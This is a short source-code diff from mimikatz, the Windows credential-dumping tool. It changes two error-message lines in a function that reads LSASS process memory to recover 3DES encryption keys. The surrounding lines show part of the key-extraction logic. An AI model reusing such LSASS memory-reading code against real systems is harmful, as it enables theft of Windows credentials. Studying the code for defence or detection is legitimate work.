@@ -112,9 +112,9 @@ bool mod_mimikatz_sekurlsa_keys_nt6::searchAndInitLSASSData()
 						if(mod_memory::readMemory(reinterpret_cast<PBYTE>(maCle.cle) + FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), &(*h3DesKey)->cle->data, maCleData.size - FIELD_OFFSET(KIWI_BCRYPT_KEY_DATA, data), mod_mimikatz_sekurlsa::hLSASS))
 							mesSucces++;
 		}
-		else wcout << L"LsaInitializeProtectedMemory NT6 KO" << endl;
+		else (*outputStream) << L"LsaInitializeProtectedMemory NT6 KO" << endl;
 	}
-	else wcout << L"mod_memory::searchMemory NT6 " << mod_system::getWinError() << endl; 
+	else (*outputStream) << L"mod_memory::searchMemory NT6 " << mod_system::getWinError() << endl; 
 
 	return (mesSucces == 3);
 }
